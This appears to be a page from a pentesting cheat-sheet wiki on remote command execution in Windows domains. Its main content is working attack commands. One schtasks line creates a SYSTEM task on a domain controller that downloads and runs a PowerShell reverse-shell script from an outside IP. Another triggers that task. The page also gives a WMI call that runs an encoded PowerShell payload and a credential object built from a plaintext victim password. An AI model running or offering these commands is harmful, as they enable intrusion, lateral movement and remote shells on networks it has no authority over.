---
description: Living of the land and getting RCEs
---

# 🟢 Remote Command Execution

| Tool           |   |   |
| -------------- | - | - |
| winrs          |   |   |
| Invoke-Command |   |   |
|                |   |   |

### Remote Command execution with scheduled tasks <a href="#command-execution-with-scheduled-tasks" id="command-execution-with-scheduled-tasks"></a>

{% code overflow="wrap" %}
```powershell
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dc.targetdomain.com /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.10.5/Invoke-PowerShellTcpRun.ps1''')'"
```
{% endcode %}

```
schtasks /RUN /TN "shell" /s dc.targetdomain.com
```

### WMI - Remote Command execution <a href="#command-execution-with-wmi" id="command-execution-with-wmi"></a>

{% code overflow="wrap" %}
```powershell
Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist "powershell.exe -e $encodedCommand"
```
{% endcode %}

### PowerShell - Remote Command execution <a href="#command-execution-with-powershell-remoting" id="command-execution-with-powershell-remoting"></a>

{% code overflow="wrap" %}
```powershell
$SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\targetuser', $SecPassword)
```
{% endcode %}
